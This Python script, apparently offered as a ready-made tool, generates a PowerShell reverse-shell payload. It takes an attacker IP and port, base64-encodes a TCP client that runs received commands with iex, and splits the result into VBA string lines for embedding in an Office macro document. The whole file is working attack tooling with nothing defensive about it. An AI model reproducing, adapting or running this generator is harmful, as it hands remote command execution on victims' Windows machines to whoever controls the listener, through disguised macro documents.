#!/usr/bin/env python3
# Payload from YSah44 


import sys
import base64
from colorama import Fore, Style, init
print("\033[1;36m" + r"""
 ,---,---,---,---,---,---,---,---,---,---,---,---,
| Y ||   | S |   |
|---'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-|
|     ___                                             __
|   /   \           ___ ___   ____ ___  ____   _____/  |_
|   \_   \   ______\  \\  \_/ ___\\  \/  /  _ \ /    \   __\
|   /   /  /_____/  >  <\___ \\___ \>    <\_\ \_\   |  |
|  /___/           /__/ /____/_____/__/\_ \___  /___|  /
|                                       \/    \/     \/
|---,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'--|
| Y | |   | S |   |
 `---'---'---'---'---'---'---'---'---'---'---'---'---'
""" + "\033[0m")
init(autoreset=True)

def help():
    print("python3 ysshellvba.py")
    print("USAGE:After input IP and PORT it will create automotic payload.txt file on same folder")
    print("Returns reverse shell PowerShell base64 encoded cmdline payload connecting to IP:PORT")
    exit()

ip = input(Fore.RED + "Enter IP Address: ")
port = int(input(Fore.RED + "Enter Port Number: "))

payload = '$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
payload = payload % (ip, port)

cmdline = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
#Create vba format
str = cmdline
n = 50
with open("payload.txt", "w") as f:
    for i in range(0, len(str), n):
        f.write('Str = str + "' + str[i:i+n] + '"\n')
print("PAYLOAD.TXT ALREADY CREATED ON SAME FOLDER !!!!!!")
print("FOR CREATE MACRO CODE DOC PLEASE VISIT TO MY PAGE https://")
# Check if the user wants to print the content
print_content = input("Do you want to print the content of payload.txt? (yes/no): ")

if print_content.lower() == "yes":
    # Print the content of payload.txt
    with open("payload.txt", "r") as f:
        content = f.readlines()
        colors = [Fore.MAGENTA]
        for idx, line in enumerate(content):
            print(colors[idx % len(colors)] + line.strip())
